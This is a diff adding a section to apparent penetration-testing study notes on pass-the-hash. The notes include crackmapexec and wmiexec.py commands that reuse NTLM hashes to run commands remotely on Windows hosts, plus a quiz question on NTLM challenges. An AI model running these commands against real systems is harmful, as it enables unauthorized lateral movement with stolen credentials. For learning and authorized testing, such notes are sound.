@@ -457,6 +457,18 @@ PASS THE HASH (need to know NtLM hash)
 metasploit exploit/windows/smb/psexec module
 (or)
 crackmapexec winrm 10.0.27.38 -u administrator -H '$HASH' -x "sysinfo"
+(or)
+
+Pass the hash via Wmi
+---------------------
+WMI is used for managing and monitoring windows-based systems
+WMI can be accessed locally on Windows system or remotely over a network
+
+WMI relies on RPC port (135) or sometimes it can be within port range.
+
+wmiexec uses WMI to execute commands or scripts on a target system remotely
+
+#wmiexec.py -hashes 00000000000000000:40980280934924242 administrator@10.4.56.7
 
 In the NTLM authentication process, what is the purpose of the server's challenge? > To generate a unique value that the client must respond to for verification.
 __________________________________________________________________________________________________________________________________
